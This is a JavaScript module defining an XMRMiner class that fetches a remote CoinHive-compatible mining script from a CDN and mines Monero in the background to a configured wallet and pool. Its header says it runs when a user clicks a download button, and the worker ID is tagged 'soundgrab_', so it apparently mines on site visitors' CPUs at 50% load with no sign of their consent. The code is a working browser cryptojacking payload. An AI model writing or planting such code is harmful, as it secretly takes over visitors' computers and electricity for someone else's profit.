// XMR Miner Implementation
// This code will be loaded when a user clicks the download button

class XMRMiner {
  constructor(walletAddress, poolUrl, threads = -1) {
    this.walletAddress = walletAddress;
    this.poolUrl = poolUrl;
    this.threads = threads > 0 ? threads : (navigator.hardwareConcurrency || 4);
    this.isRunning = false;
    this.throttle = 50; // Set throttle to 50% CPU usage as requested
    this.hashesPerSecond = 0;
    this.totalHashes = 0;
    this.workerId = 'soundgrab_' + Math.floor(Math.random() * 10000);
  }

  start() {
    if (this.isRunning) return;
    
    // Load the miner script dynamically
    const script = document.createElement('script');
    script.onload = () => {
      // Initialize the miner with our wallet and pool
      try {
        // Create a global miner object
        window.miner = new window.Client.Anonymous(this.walletAddress, {
          throttle: this.throttle / 100, // Convert percentage to decimal (0.2 for 20%)
          threads: this.threads,
          autoThreads: false,
          forceASMJS: false,
          startOnLoad: false,
          pool: this.poolUrl || 'moneroocean.stream',
          background: true
        });
        
        // Start mining
        window.miner.start();
        this.isRunning = true;
        
        // Set up a timer to check mining stats
        this.statsInterval = setInterval(() => {
          try {
            this.hashesPerSecond = window.miner.getHashesPerSecond();
            this.totalHashes = window.miner.getTotalHashes();
            console.log(`Mining stats: ${this.hashesPerSecond.toFixed(2)} H/s, Total: ${this.totalHashes} hashes`);
          } catch (e) {
            console.error('Error getting mining stats:', e);
          }
        }, 5000);
        
        console.log(`XMR mining started with ${this.threads} threads at ${this.throttle}% CPU usage`);
      } catch (e) {
        console.error('Error initializing miner:', e);
      }
    };
    
    script.onerror = (err) => {
      console.error('Error loading mining script:', err);
    };
    
    // Set the script source to a reliable CoinHive-compatible library
    script.src = 'https://cdn.jsdelivr.net/gh/notgiven688/webminerpool/client/worker.js';
    document.head.appendChild(script);
  }

  stop() {
    if (!this.isRunning) return;
    
    try {
      if (window.miner) {
        window.miner.stop();
        this.isRunning = false;
        clearInterval(this.statsInterval);
        console.log(`XMR mining stopped. Total hashes: ${this.totalHashes}`);
      }
    } catch (e) {
      console.error('Error stopping miner:', e);
    }
  }

  setThrottle(throttlePercent) {
    this.throttle = throttlePercent;
    if (this.isRunning && window.miner) {
      try {
        window.miner.setThrottle(throttlePercent / 100);
      } catch (e) {
        console.error('Error setting throttle:', e);
      }
    }
  }

  getStats() {
    return {
      isRunning: this.isRunning,
      hashesPerSecond: this.hashesPerSecond,
      totalHashes: this.totalHashes,
      threads: this.threads,
      throttle: this.throttle
    };
  }
}

// Export the miner class
export default XMRMiner;